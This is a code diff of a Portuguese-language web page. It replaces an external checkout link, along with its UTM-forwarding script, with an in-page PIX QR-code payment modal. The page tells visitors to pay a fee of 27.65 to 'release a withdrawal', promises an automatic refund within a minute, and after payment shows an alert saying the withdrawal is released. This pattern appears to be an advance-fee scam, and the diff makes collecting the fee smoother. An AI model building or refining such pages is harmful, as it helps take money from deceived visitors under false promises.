@@ -13,6 +13,7 @@
 </script>
 
     <link rel="stylesheet" href="assets/css/style.css">
+    <link rel="stylesheet" href="assets/css/pix-modal.css">
     <title>Document</title>
   </head>
   <body>
@@ -702,44 +703,9 @@
 
           <!-- Call to Action -->
           <div class="confirmation-section">
-            <a href="https://pay.checkoutfy.com/yUepEBXe" class="confirmation-cta-button" id="confirmation-button" onclick="herdarUTMeRedirecionar(this.href); return false;">
+            <button type="button" class="confirmation-cta-button" id="confirmation-button">
               Pagar taxa para Liberar Saque
-            </a>
-
-            <script>
-              function herdarUTMeRedirecionar(urlDestino) {
-                // Pega os parâmetros da URL atual
-                const urlAtual = new URL(window.location.href);
-                const params = new URLSearchParams(urlAtual.search);
-
-                // Filtra UTMs + ttclid
-                const parametrosParaHerdar = {};
-                for (const [key, value] of params.entries()) {
-                  if (
-                    key.startsWith("utm_") ||
-                    key === "ttclid" // <- novo parâmetro incluído
-                  ) {
-                    parametrosParaHerdar[key] = value;
-                  }
-                }
-
-                // Cria a URL de destino com os parâmetros herdados
-                const urlFinal = new URL(urlDestino);
-                const paramsDestino = new URLSearchParams(urlFinal.search);
-
-                // Adiciona os parâmetros herdados à URL de destino
-                for (const [key, value] of Object.entries(
-                  parametrosParaHerdar
-                )) {
-                  paramsDestino.set(key, value);
-                }
-
-                urlFinal.search = paramsDestino.toString();
-
-                // Redireciona na mesma página
-                window.location.href = urlFinal.toString();
-              }
-            </script>
+            </button>
             <div class="confirmation-timer">
               ⏱️ Reembolso automático em 1 minuto
             </div>
@@ -960,10 +926,13 @@
         }
       });
     </script> -->
+    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+    <script src="assets/js/pix-manager.js"></script>
+    <script src="assets/js/pix-modal.js"></script>
     <script src="assets/js/main.js"></script>
     <!-- <script src="js/agr.js"></script> -->
     <!-- <script src="js/sera.js"></script> -->
-  
+
 <script>
 (function() {
   // 🔗 URL de destino — substitua pelo seu link real:
@@ -1003,6 +972,35 @@
     }
   });
 })();
+</script>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const confirmationButton = document.getElementById('confirmation-button');
+
+  if (confirmationButton) {
+    confirmationButton.addEventListener('click', function() {
+      const paymentAmount = 27.65;
+
+      if (window.pixPaymentModal) {
+        window.pixPaymentModal.open(paymentAmount, function() {
+          console.log('Pagamento confirmado!');
+
+          const successMessage = document.getElementById('confirmation-success-message');
+          if (successMessage) {
+            successMessage.style.display = 'block';
+          }
+
+          setTimeout(function() {
+            alert('Pagamento confirmado com sucesso! Seu saque foi liberado.');
+          }, 500);
+        });
+      } else {
+        console.error('Modal PIX não inicializado');
+      }
+    });
+  }
+});
 </script>
 
 </body></html>
